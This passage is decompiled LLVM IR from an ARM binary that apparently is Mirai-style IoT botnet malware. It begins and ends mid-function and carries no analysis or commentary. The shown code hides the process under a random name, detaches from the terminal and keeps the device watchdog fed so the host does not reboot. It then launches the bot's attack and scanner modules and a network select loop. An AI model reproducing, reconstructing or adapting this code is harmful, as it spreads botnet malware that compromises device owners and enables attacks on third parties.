  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i16* %stack_var_-44, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bind, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_20dc8.77 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_20dc8.77, { 1, 0 }
  uselistorder label %dec_label_pc_c1fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1e4, { 1, 2, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_c260 = load i32, i32* @r4, align 4
  %v6_c260 = load i32, i32* @r5, align 4
  %v9_c260 = load i32, i32* @lr, align 4
  %v0_c268 = call i32 @__libc_fork()
  %v7_c26c = icmp eq i32 %v0_c268, -1
  %. = zext i1 %v7_c26c to i32
  %tmp12 = icmp slt i32 %v0_c268, 1
  %storemerge5 = select i1 %tmp12, i32 %., i32 1
  store i32 %storemerge5, i32* @r5, align 4
  %v2_c288 = icmp eq i32 %storemerge5, 0
  store i32 %v0_c268, i32* @global_var_20f38.80, align 4
  br i1 %v2_c288, label %dec_label_pc_c2a0, label %dec_label_pc_c294

dec_label_pc_c294:                                ; preds = %entry
  store i32 %v3_c260, i32* @r4, align 4
  store i32 %v6_c260, i32* @r5, align 4
  store i32 %v9_c260, i32* @lr, align 4
  ret i32 %v0_c268

dec_label_pc_c2a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_c2ac = call i32 @table_unlock_val(i32 35)
  %v1_c2b4 = call i32 @table_unlock_val(i32 36)
  %v0_c2b8 = load i32, i32* @r5, align 4
  %v2_c2c0 = inttoptr i32 %v0_c2b8 to i32*
  %v3_c2c0 = call i32 @table_retrieve_val(i32 35, i32* %v2_c2c0)
  %v2_c2c8 = call i32 @__libc_open(i32 %v3_c2c0, i32 2)
  %v7_c2cc = icmp eq i32 %v2_c2c8, -1
  store i32 %v2_c2c8, i32* @r4, align 4
  br i1 %v7_c2cc, label %dec_label_pc_c314, label %dec_label_pc_c2d8

dec_label_pc_c2d8:                                ; preds = %dec_label_pc_c314, %dec_label_pc_c2a0
  %v0_c2e4 = phi i32 [ %v2_c324, %dec_label_pc_c314 ], [ %v2_c2c8, %dec_label_pc_c2a0 ]
  %v2_c2e8 = ptrtoint i32* %stack_var_-20 to i32
  %v3_c2ec = call i32 @ioctl(i32 %v0_c2e4, i32 -2147199228, i32 %v2_c2e8)
  br label %dec_label_pc_c2f0

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_c2f0, %dec_label_pc_c2d8
  %v0_c2fc = load i32, i32* @r4, align 4
  %v3_c304 = call i32 @ioctl(i32 %v0_c2fc, i32 -2147199227, i32 0)
  %v1_c30c = call i32 @sleep(i32 10)
  br label %dec_label_pc_c2f0

dec_label_pc_c314:                                ; preds = %dec_label_pc_c2a0
  %v0_c314 = load i32, i32* @r5, align 4
  %v2_c31c = inttoptr i32 %v0_c314 to i32*
  %v3_c31c = call i32 @table_retrieve_val(i32 36, i32* %v2_c31c)
  %v2_c324 = call i32 @__libc_open(i32 %v3_c31c, i32 2)
  %v3_c328 = icmp eq i32 %v2_c324, -1
  store i32 %v2_c324, i32* @r4, align 4
  br i1 %v3_c328, label %dec_label_pc_c334, label %dec_label_pc_c2d8

dec_label_pc_c334:                                ; preds = %dec_label_pc_c314
  %v1_c338 = call i32 @table_lock_val(i32 35)
  %v1_c340 = call i32 @table_lock_val(i32 36)
  %v0_c344 = load i32, i32* @r5, align 4
  %v1_c348 = call i32 @__GI_exit(i32 %v0_c344)
  %v0_c34c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c34c, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_c334
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_c334, %bb15
  %v3_c34c = phi i32 [ %v1_c348, %dec_label_pc_c334 ], [ 0, %bb15 ]
  ret i32 %v3_c34c

; uselistorder directives
  uselistorder i32 %v2_c324, { 1, 2, 0 }
  uselistorder i32 %v2_c2c8, { 1, 2, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v0_c268, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_c360 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_c360, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_c378 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_c384 = call i32 @__GI_sigaddset(i32 %v2_c360, i32 2)
  %v0_c388 = load i32, i32* @r5, align 4
  store i32 %v0_c388, i32* %r2.global-to-local, align 4
  %v4_c394 = call i32 @__GI_sigprocmask(i32 %v0_c388, i32* nonnull %stack_var_-64, i32 %v0_c388)
  %v2_c3a0 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_c3ac = call i32 @bsd_signal(i32 5, i32 49324)
  %v0_c3b0 = call i32 @util_local_addr()
  store i16 -23551, i16* bitcast (i32* @global_var_23a52.73 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* %r3.global-to-local, align 4
  store i32 -583215265, i32* %r2.global-to-local, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 %v0_c3b0, i32* @global_var_23a4c.55, align 4
  store i32 -583215265, i32* @global_var_23a54.72, align 4
  store i16 2, i16* bitcast (i16** @global_var_23a50.70 to i16*), align 4
  %v5_c3e4 = call i32 @table_init(i32 %v0_c3b0, i32 ptrtoint (i16** @global_var_23a50.70 to i32), i32 -583215265, i32 ptrtoint (i32* @global_var_23a4c.55 to i32))
  store i32 ptrtoint (i32* @global_var_c0c4.66 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20dc4.68 to i32), i32* @lr, align 4
  %v2_c3f0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_c3f0, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_c0c4.66 to i32), i32* @global_var_20dc4.68, align 4
  %v1_c3f8 = call i32 @ensure_single_instance(i32 %v5_c3e4)
  %v1_c3fc = call i32 @rand_init(i32 %v1_c3f8)
  %v2_c408 = call i32 @util_zero(i32 %v2_c3f0, i32 32)
  %v0_c40c = load i32, i32* @r6, align 4
  %v7_c40c = icmp eq i32 %v0_c40c, 2
  br i1 %v7_c40c, label %dec_label_pc_c538, label %dec_label_pc_c414

dec_label_pc_c414:                                ; preds = %dec_label_pc_c538, %entry, %dec_label_pc_c548
  %v0_c414 = call i32 @rand_next()
  store i32 %v0_c414, i32* @r6, align 4
  %v0_c41c = load i32, i32* @r8, align 4
  %v1_c41c = inttoptr i32 %v0_c41c to i32*
  %v2_c41c = load i32, i32* %v1_c41c, align 4
  %v1_c420 = inttoptr i32 %v2_c41c to i8*
  %v2_c420 = call i32 @util_strlen(i8* %v1_c420)
  %v0_c428 = load i32, i32* @r8, align 4
  %v1_c428 = inttoptr i32 %v0_c428 to i32*
  %v2_c428 = load i32, i32* %v1_c428, align 4
  %v1_c42c = inttoptr i32 %v2_c428 to i8*
  %v2_c42c = call i32 @util_strlen(i8* %v1_c42c)
  %v1_c430 = sub i32 20, %v2_c420
  %v0_c438 = load i32, i32* @r6, align 4
  %v3_c43c = urem i32 %v0_c438, %v1_c430
  %v2_c440 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_c440, i32* @r5, align 4
  %v2_c444 = add i32 %v3_c43c, %v2_c42c
  store i32 %v2_c444, i32* @r4, align 4
  %v2_c450 = call i32 @rand_alphastr(i32 %v2_c440, i32 %v2_c444)
  %v2_c454 = ptrtoint i32* %stack_var_-40 to i32
  %v1_c458 = load i32, i32* @r4, align 4
  %v2_c458 = add i32 %v1_c458, %v2_c454
  store i32 %v2_c458, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_c464 = load i32, i32* @r8, align 4
  %v1_c464 = inttoptr i32 %v0_c464 to i32*
  %v2_c464 = load i32, i32* %v1_c464, align 4
  store i32 %v2_c464, i32* @r0, align 4
  %v3_c468 = add i32 %v2_c458, -80
  %v4_c468 = inttoptr i32 %v3_c468 to i8*
  store i8 0, i8* %v4_c468, align 1
  %v2_c46c = inttoptr i32 %v2_c464 to i8*
  %v3_c46c = call i32 @util_strcpy(i8* %v2_c46c, i32 %v2_c440)
  %v2_c478 = call i32 @util_zero(i32 %v2_c440, i32 32)
  %v0_c47c = call i32 @rand_next()
  store i32 %v0_c47c, i32* @r7, align 4
  %v0_c484 = load i32, i32* @r8, align 4
  %v1_c484 = inttoptr i32 %v0_c484 to i32*
  %v2_c484 = load i32, i32* %v1_c484, align 4
  %v1_c488 = inttoptr i32 %v2_c484 to i8*
  %v2_c488 = call i32 @util_strlen(i8* %v1_c488)
  store i32 %v2_c488, i32* @r6, align 4
  %v0_c490 = load i32, i32* @r8, align 4
  %v1_c490 = inttoptr i32 %v0_c490 to i32*
  %v2_c490 = load i32, i32* %v1_c490, align 4
  %v1_c494 = inttoptr i32 %v2_c490 to i8*
  %v2_c494 = call i32 @util_strlen(i8* %v1_c494)
  %v0_c498 = load i32, i32* @r6, align 4
  %v1_c498 = sub i32 20, %v0_c498
  %v0_c4a0 = load i32, i32* @r7, align 4
  %v3_c4a4 = urem i32 %v0_c4a0, %v1_c498
  %v2_c4a8 = add i32 %v3_c4a4, %v2_c494
  store i32 %v2_c4a8, i32* @r4, align 4
  %v2_c4b4 = call i32 @rand_alphastr(i32 %v2_c440, i32 %v2_c4a8)
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v1_c4bc = load i32, i32* @r4, align 4
  %v2_c4bc = add i32 %v1_c4bc, %v2_c454
  store i32 %v2_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sl, align 4
  %v1_c4c0 = trunc i32 %v0_c4c0 to i8
  %v3_c4c0 = add i32 %v2_c4bc, -80
  %v4_c4c0 = inttoptr i32 %v3_c4c0 to i8*
  store i8 %v1_c4c0, i8* %v4_c4c0, align 1
  %v4_c4cc = call i32 @prctl(i32 15, i32 %v2_c440, i32 %v2_c454, i32 %v2_c4bc)
  %v1_c4d4 = call i32 @table_unlock_val(i32 3)
  %v3_c4e4 = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_c4e8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c4e8, i32* @r2, align 4
  %v2_c4f4 = inttoptr i32 %v3_c4e4 to i64*
  %v3_c4f4 = call i32 @__GI___libc_write(i32 1, i64* %v2_c4f4)
  store i32 1, i32* @r2, align 4
  %v3_c504 = call i32 @__GI___libc_write(i32 1, i64* bitcast (i32* @global_var_18114.87 to i64*))
  %v1_c50c = call i32 @table_lock_val(i32 3)
  %v1_c510 = call i32 @attack_init(i32 %v1_c50c)
  %v1_c514 = call i32 @watchdog_maintain(i32 %v1_c510)
  %v0_c518 = call i32 @__libc_fork()
  %v1_c51c = load i32, i32* @sl, align 4
  %v7_c520 = icmp sgt i32 %v0_c518, %v1_c51c
  br i1 %v7_c520, label %dec_label_pc_c524, label %dec_label_pc_c570

dec_label_pc_c524:                                ; preds = %dec_label_pc_c414
  ret i32 %v1_c51c

dec_label_pc_c538:                                ; preds = %entry
  %v0_c538 = load i32, i32* @r8, align 4
  %v1_c538 = add i32 %v0_c538, 4
  %v2_c538 = inttoptr i32 %v1_c538 to i32*
  %v3_c538 = load i32, i32* %v2_c538, align 4
  %v1_c53c = inttoptr i32 %v3_c538 to i8*
  %v2_c53c = call i32 @util_strlen(i8* %v1_c53c)
  %v8_c544 = icmp sgt i32 %v2_c53c, 31
  br i1 %v8_c544, label %dec_label_pc_c414, label %dec_label_pc_c548

dec_label_pc_c548:                                ; preds = %dec_label_pc_c538
  %v0_c548 = load i32, i32* @r8, align 4
  %v1_c548 = add i32 %v0_c548, 4
  %v2_c548 = inttoptr i32 %v1_c548 to i32*
  %v3_c548 = load i32, i32* %v2_c548, align 4
  store i32 %v2_c3f0, i32* @r0, align 4
  %v2_c550 = bitcast i32* %stack_var_-152 to i8*
  %v3_c550 = call i32 @util_strcpy(i8* %v2_c550, i32 %v3_c548)
  %v0_c554 = load i32, i32* @r8, align 4
  %v1_c554 = add i32 %v0_c554, 4
  %v2_c554 = inttoptr i32 %v1_c554 to i32*
  %v3_c554 = load i32, i32* %v2_c554, align 4
  %v1_c55c = inttoptr i32 %v3_c554 to i8*
  %v2_c55c = call i32 @util_strlen(i8* %v1_c55c)
  %v2_c568 = call i32 @util_zero(i32 %v3_c554, i32 %v2_c55c)
  br label %dec_label_pc_c414

dec_label_pc_c570:                                ; preds = %dec_label_pc_c414
  %v1_c570 = call i32 @__GI_setsid(i32 %v0_c518)
  %v0_c578 = load i32, i32* @sl, align 4
  %v1_c57c = call i32 @__GI___libc_close(i32 %v0_c578)
  %v1_c584 = call i32 @__GI___libc_close(i32 1)
  %v1_c58c = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_20dc0.89 to i32), i32* @fp, align 4
  %v1_c594 = call i32 @attack_init(i32 %v1_c58c)
  %v1_c598 = call i32 @watchdog_maintain(i32 %v1_c594)
  %v1_c59c = call i32 @scanner_init(i32 %v1_c598)
  %v0_c5a0 = load i32, i32* @sl, align 4
  %v2_c5a4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_c5a4, i32* @r7, align 4
  %v2_c5a8 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_c5a8, i32* @r6, align 4
  %v2_c688 = ptrtoint i32* %stack_var_-72 to i32
  %v2_c6d8 = ptrtoint i32* %stack_var_-168 to i32
  %v2_c8b4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_c8bc = ptrtoint i8** %stack_var_-42 to i32
  %v2_ca60 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_c8d8 = ptrtoint i32* %stack_var_-52 to i32
  %v1_c988 = bitcast i32* %stack_var_-152 to i8*
  %v2_c94c = ptrtoint i32* %stack_var_-88 to i32
  %v1_c964 = sub i32 0, %v1_c570
  br label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c9e8, %dec_label_pc_ca84, %bb44, %dec_label_pc_c984, %dec_label_pc_c7bc, %dec_label_pc_c7ac, %bb41, %dec_label_pc_cad8, %dec_label_pc_ca44, %dec_label_pc_c9f8, %dec_label_pc_c9d4, %dec_label_pc_c904, %dec_label_pc_c82c, %dec_label_pc_c764, %dec_label_pc_c570
  %stack_var_-1436.0 = phi i32 [ %v0_c5a0, %dec_label_pc_c570 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_c7ac ], [ %stack_var_-1436.1, %dec_label_pc_c7bc ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_c9f8 ], [ %stack_var_-1436.1, %dec_label_pc_c82c ], [ %stack_var_-1436.1, %dec_label_pc_ca84 ], [ %stack_var_-1436.1, %dec_label_pc_cad8 ], [ %stack_var_-1436.1, %dec_label_pc_ca44 ], [ %stack_var_-1436.1, %dec_label_pc_c764 ], [ %stack_var_-1436.1, %dec_label_pc_c984 ], [ %stack_var_-1436.1, %dec_label_pc_c9d4 ], [ %stack_var_-1436.1, %dec_label_pc_c904 ], [ %stack_var_-1436.1, %dec_label_pc_c9e8 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5b8

dec_label_pc_c5b8:                                ; preds = %dec_label_pc_c5b8, %dec_label_pc_c5ac
  %v1_c5bc = phi i32 [ %v1_c5c0, %dec_label_pc_c5b8 ], [ 4, %dec_label_pc_c5ac ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c5bc = load i32, i32* @r7, align 4
  %v3_c5bc = add i32 %v2_c5bc, %v1_c5bc
  %v4_c5bc = inttoptr i32 %v3_c5bc to i32*
  store i32 0, i32* %v4_c5bc, align 4
  %v0_c5c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5c0 = add i32 %v0_c5c0, 4
  store i32 %v1_c5c0, i32* %r3.global-to-local, align 4
  %v7_c5c4 = icmp eq i32 %v1_c5c0, 128
  br i1 %v7_c5c4, label %dec_label_pc_c5cc, label %dec_label_pc_c5b8

dec_label_pc_c5cc:                                ; preds = %dec_label_pc_c5b8
  %v0_c5cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_c5cc, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %dec_label_pc_c5d4, %dec_label_pc_c5cc
  %v1_c5d8 = phi i32 [ %v1_c5dc, %dec_label_pc_c5d4 ], [ 4, %dec_label_pc_c5cc ]
  store i32 0, i32* @r4, align 4
  %v2_c5d8 = load i32, i32* @r6, align 4
  %v3_c5d8 = add i32 %v2_c5d8, %v1_c5d8
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i32*
  store i32 0, i32* %v4_c5d8, align 4
  %v0_c5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_c5dc = add i32 %v0_c5dc, 4
  store i32 %v1_c5dc, i32* %r3.global-to-local, align 4
  %v7_c5e0 = icmp eq i32 %v1_c5dc, 128
  br i1 %v7_c5e0, label %dec_label_pc_c5e8, label %dec_label_pc_c5d4

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5d4
  store i32 ptrtoint (i32* @global_var_20dbc.75 to i32), i32* %r3.global-to-local, align 4
  %v2_c5ec = load i32, i32* @global_var_20dbc.75, align 4
  %v7_c5f0 = icmp eq i32 %v2_c5ec, -1
  br i1 %v7_c5f0, label %dec_label_pc_c61c, label %dec_label_pc_c5f8

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5e8
  %v3_c5f8 = udiv i32 %v2_c5ec, 32
  %v3_c5fc = mul nuw nsw i32 %v3_c5f8, 4
  store i32 %v2_c454, i32* %ip.global-to-local, align 4
  %v2_c604 = add i32 %v3_c5fc, %v2_c454
  store i32 %v2_c604, i32* %r3.global-to-local, align 4
  %v1_c608 = add i32 %v2_c604, -240
  %v2_c608 = inttoptr i32 %v1_c608 to i32*
  %v3_c608 = load i32, i32* %v2_c608, align 4
  %v1_c60c = urem i32 %v2_c5ec, 32
  %v7_c614 = shl i32 1, %v1_c60c
  %v8_c614 = or i32 %v3_c608, %v7_c614
  store i32 %v8_c614, i32* %r2.global-to-local, align 4
  store i32 %v8_c614, i32* %v2_c608, align 4
  br label %dec_label_pc_c61c

dec_label_pc_c61c:                                ; preds = %dec_label_pc_c5e8, %dec_label_pc_c5f8
  %v2_c61c = load i32, i32* @global_var_20dc0.89, align 4
  store i32 %v2_c61c, i32* @r3, align 4
  %v7_c620 = icmp eq i32 %v2_c61c, -1
  store i32 ptrtoint (i32* @global_var_20dc0.89 to i32), i32* @r8, align 4
  br i1 %v7_c620, label %dec_label_pc_c844, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c844, %dec_label_pc_c61c, %bb43
  %v2_c630 = load i8, i8* bitcast (i8** @global_var_20f3c.92 to i8*), align 4
  %v2_c634 = icmp eq i8 %v2_c630, 0
  %v2_c780 = load i32, i32* @global_var_20dc0.89, align 4
  store i32 %v2_c780, i32* %ip.global-to-local, align 4
  %v3_c784 = udiv i32 %v2_c780, 32
  store i32 %v3_c784, i32* %r3.global-to-local, align 4
  br i1 %v2_c634, label %dec_label_pc_c780, label %dec_label_pc_c63c

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c62c
  %v3_c648 = mul nuw nsw i32 %v3_c784, 4
  %v2_c64c = add i32 %v3_c648, %v2_c454
  store i32 %v2_c64c, i32* %r3.global-to-local, align 4
  %v1_c650 = add i32 %v2_c64c, -368
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  %v1_c654 = urem i32 %v2_c780, 32
  %v7_c65c = shl i32 1, %v1_c654
  %v8_c65c = or i32 %v3_c650, %v7_c65c
  store i32 %v8_c65c, i32* %r2.global-to-local, align 4
  store i32 %v8_c65c, i32* %v2_c650, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c780, %dec_label_pc_c63c
  store i32 ptrtoint (i32* @global_var_20dbc.75 to i32), i32* %r3.global-to-local, align 4
  %v2_c668 = load i32, i32* @global_var_20dbc.75, align 4
  store i32 0, i32* @lr, align 4
  %v0_c670 = load i32, i32* %ip.global-to-local, align 4
  %v5_c674 = icmp slt i32 %v0_c670, %v2_c668
  br i1 %v5_c674, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_c664
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_c664, %bb
  %v0_c684 = phi i32 [ %v2_c668, %dec_label_pc_c664 ], [ %v0_c670, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_c684 = add i32 %v0_c684, 1
  store i32 %v2_c688, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c5a8, i32* %r2.global-to-local, align 4
  %v5_c6a0 = call i32 @__libc_select(i32 %v1_c684, i32 %v2_c5a4, i32 %v2_c5a8, i32 0, i32 %v2_c688)
  %v8_c6a4 = icmp eq i32 %v5_c6a0, -1
  br i1 %v8_c6a4, label %dec_label_pc_c5ac, label %dec_label_pc_c6ac

dec_label_pc_c6ac:                                ; preds = %bb41
  %v6_c6a0 = trunc i32 %v5_c6a0 to i16
  %v3_c6ac = icmp eq i16 %v6_c6a0, 0
  br i1 %v3_c6ac, label %dec_label_pc_c6b4, label %dec_label_pc_c6e8

dec_label_pc_c6b4:                                ; preds = %dec_label_pc_c6ac
  %v5_c6c0 = srem i32 %stack_var_-1436.0, 6
  %v4_c6c8 = sub i32 %stack_var_-1436.0, %v5_c6c0
  store i32 %v4_c6c8, i32* %r3.global-to-local, align 4
  %v2_c6d0 = icmp eq i32 %v5_c6c0, 0
  %v1_c6d4 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_c6d4, i32* @lr, align 4
  store i32 %v2_c6d8, i32* %r2.global-to-local, align 4
  %v7_c6dc = inttoptr i32 %v5_c6a0 to i8*
  store i8* %v7_c6dc, i8** %stack_var_-42, align 4
  br i1 %v2_c6d0, label %dec_label_pc_c8b4, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c6ac, %dec_label_pc_c6b4, %dec_label_pc_c8b4
  %stack_var_-1436.1 = phi i32 [ %v1_c6d4, %dec_label_pc_c8b4 ], [ %v1_c6d4, %dec_label_pc_c6b4 ], [ %stack_var_-1436.0, %dec_label_pc_c6ac ]
  store i32 ptrtoint (i32* @global_var_20dbc.75 to i32), i32* %r3.global-to-local, align 4
  %v2_c6ec = load i32, i32* @global_var_20dbc.75, align 4
  %v7_c6f0 = icmp eq i32 %v2_c6ec, -1
  br i1 %v7_c6f0, label %dec_label_pc_c71c, label %dec_label_pc_c6f8

dec_label_pc_c6f8:                                ; preds = %dec_label_pc_c6e8
  %v3_c6f8 = udiv i32 %v2_c6ec, 32
  %v3_c6fc = mul nuw nsw i32 %v3_c6f8, 4
  store i32 %v2_c454, i32* %ip.global-to-local, align 4
  %v2_c704 = add i32 %v3_c6fc, %v2_c454
  store i32 %v2_c704, i32* %r3.global-to-local, align 4
  %v1_c708 = add i32 %v2_c704, -240
  %v2_c708 = inttoptr i32 %v1_c708 to i32*
  %v3_c708 = load i32, i32* %v2_c708, align 4
  %v1_c70c = urem i32 %v2_c6ec, 32
  %v6_c710 = ashr i32 %v3_c708, %v1_c70c
  store i32 %v6_c710, i32* %r2.global-to-local, align 4
  %v1_c714 = urem i32 %v6_c710, 2
  %v2_c714 = icmp eq i32 %v1_c714, 0
  br i1 %v2_c714, label %dec_label_pc_c71c, label %dec_label_pc_c940

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c6f8, %dec_label_pc_c6e8
  %v2_c720 = load i8, i8* bitcast (i8** @global_var_20f3c.92 to i8*), align 4
  %v3_c720 = zext i8 %v2_c720 to i32
  store i32 %v3_c720, i32* @r4, align 4
  %v2_c724 = icmp eq i8 %v2_c720, 0
  %v2_c7ac = load i32, i32* @global_var_20dc0.89, align 4
  br i1 %v2_c724, label %dec_label_pc_c7ac, label %dec_label_pc_c72c

dec_label_pc_c72c:                                ; preds = %dec_label_pc_c71c
  %v3_c730 = udiv i32 %v2_c7ac, 32
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v3_c738 = mul nuw nsw i32 %v3_c730, 4
  %v2_c73c = add i32 %v3_c738, %v2_c454
  store i32 %v2_c73c, i32* %r3.global-to-local, align 4
  %v1_c740 = add i32 %v2_c73c, -368
  %v2_c740 = inttoptr i32 %v1_c740 to i32*
  %v3_c740 = load i32, i32* %v2_c740, align 4
  %v1_c744 = urem i32 %v2_c7ac, 32
  %v6_c748 = ashr i32 %v3_c740, %v1_c744
  store i32 %v6_c748, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_20f3c.92 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c754 = urem i32 %v6_c748, 2
  %v2_c754 = icmp eq i32 %v1_c754, 0
  store i8 0, i8* bitcast (i8** @global_var_20f3c.92 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_20dc0.89 to i32), i32* @r5, align 4
  br i1 %v2_c754, label %dec_label_pc_c764, label %dec_label_pc_c8d0

dec_label_pc_c764:                                ; preds = %dec_label_pc_c72c
  store i32 51052, i32* @lr, align 4
  %v1_c768 = icmp ne i32 %v2_c7ac, -1
  call void @__pseudo_cond_branch(i1 %v1_c768, i32 ptrtoint (i32* @global_var_12da0.94 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_c770 = load i32, i32* @r5, align 4
  %v2_c770 = inttoptr i32 %v1_c770 to i32*
  store i32 -1, i32* %v2_c770, align 4
  %v1_c778 = call i32 @sleep(i32 1)
  br label %dec_label_pc_c5ac

dec_label_pc_c780:                                ; preds = %dec_label_pc_c62c
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v3_c78c = mul nuw nsw i32 %v3_c784, 4
  %v2_c790 = add i32 %v3_c78c, %v2_c454
  store i32 %v2_c790, i32* %r3.global-to-local, align 4
  %v1_c794 = add i32 %v2_c790, -240
  %v2_c794 = inttoptr i32 %v1_c794 to i32*
  %v3_c794 = load i32, i32* %v2_c794, align 4
  %v1_c798 = urem i32 %v2_c780, 32
  %v7_c7a0 = shl i32 1, %v1_c798
  %v8_c7a0 = or i32 %v3_c794, %v7_c7a0
  store i32 %v8_c7a0, i32* %r2.global-to-local, align 4
  store i32 %v8_c7a0, i32* %v2_c794, align 4
  br label %dec_label_pc_c664

dec_label_pc_c7ac:                                ; preds = %dec_label_pc_c71c
  %v7_c7b0 = icmp eq i32 %v2_c7ac, -1
  store i32 ptrtoint (i32* @global_var_20dc0.89 to i32), i32* @r8, align 4
  br i1 %v7_c7b0, label %dec_label_pc_c5ac, label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7ac
  %v3_c7bc = udiv i32 %v2_c7ac, 32
  store i32 %v2_c454, i32* %r2.global-to-local, align 4
  %v3_c7c4 = mul nuw nsw i32 %v3_c7bc, 4
  %v2_c7c8 = add i32 %v3_c7c4, %v2_c454
  store i32 %v2_c7c8, i32* %r3.global-to-local, align 4
  %v1_c7cc = add i32 %v2_c7c8, -240
  %v2_c7cc = inttoptr i32 %v1_c7cc to i32*
  %v3_c7cc = load i32, i32* %v2_c7cc, align 4
  %v1_c7d0 = urem i32 %v2_c7ac, 32
  %v6_c7d4 = ashr i32 %v3_c7cc, %v1_c7d0
  store i32 %v6_c7d4, i32* %r2.global-to-local, align 4
  %v1_c7d8 = urem i32 %v6_c7d4, 2
  %v2_c7d8 = icmp eq i32 %v1_c7d8, 0
  br i1 %v2_c7d8, label %dec_label_pc_c5ac, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7bc
  %v6_c7e4 = inttoptr i32 %v3_c720 to i8*
  store i8* %v6_c7e4, i8** %stack_var_-42, align 4
  store i32 %v2_c8bc, i32* @sl, align 4
  %v0_c7e8 = call i32 @__GI___errno_location()
  %v0_c7ec = load i32, i32* @r4, align 4
  %v2_c7ec = inttoptr i32 %v0_c7e8 to i32*
  store i32 %v0_c7ec, i32* %v2_c7ec, align 4
  store i32 %v0_c7e8, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
